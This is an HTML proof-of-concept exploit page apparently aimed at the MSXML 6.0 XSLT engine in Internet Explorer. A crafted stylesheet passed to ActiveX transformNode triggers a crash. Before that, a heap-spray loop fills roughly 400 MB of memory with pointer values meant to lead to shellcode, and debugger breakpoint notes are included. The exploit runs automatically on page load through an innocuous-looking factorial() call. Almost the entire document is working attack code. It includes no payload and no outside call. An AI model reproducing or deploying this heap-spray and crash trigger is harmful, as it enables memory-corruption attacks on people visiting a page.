<!doctype html>
<html>
<head>

<script>

function crash() 
{
	xslcontent='<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0"><xsl:template name="main_template" match="/"><xsl:for-each select="*"><xsl:apply-templates/></xsl:for-each></xsl:template><xsl:template name="xx" match="x[position()]" /></xsl:stylesheet>';

	srcTree=new ActiveXObject("Msxml2.DOMDocument.6.0");
	xsltTree=new ActiveXObject("Msxml2.DOMDocument.6.0");
	xsltTree.loadXML(xslcontent);
	alert("crash");
	srcTree.transformNode(xsltTree);	
}

function poc() 
{
// !!! +hpa required !!!
// bp msxml6!xengine::stns; bp msxml6!xengine::brns; g;

	var intArr = new Array;
	intArr[0] = 0x01c0ffee; // marker // s 0 l?80000000 ee ff c0 01

	var count = (0x19000000-0x20)/4; // 400 Mb 

	for(var i=1; i<=count; i++)
	{
		// part1: pointers to part2
		if ( i<(0x12000000/4) ) 
		{

			if ( ((i*4+0x20)&0xffff) == (0x3c3c+4) ) 
				intArr[i] = 0x54545454;
			else
				intArr[i] = 0x3c3c3c3c; 

		}
		// part2: pointers to shellcode
		else 
			intArr[i] = 0x00badd1e; 
	}
	crash();  
}

function factorial(n) 
{
	if (n == 0) 
	{
		poc();
        	return 1;
    	} 
	else 
		return n * factorial(n - 1);
}
</script>
</head>

<body onload="factorial(30);">
	<form id="a">
	</form>
	<dfn id="b">
	</dfn>
<div id="resTree"></div>

</body>
</html>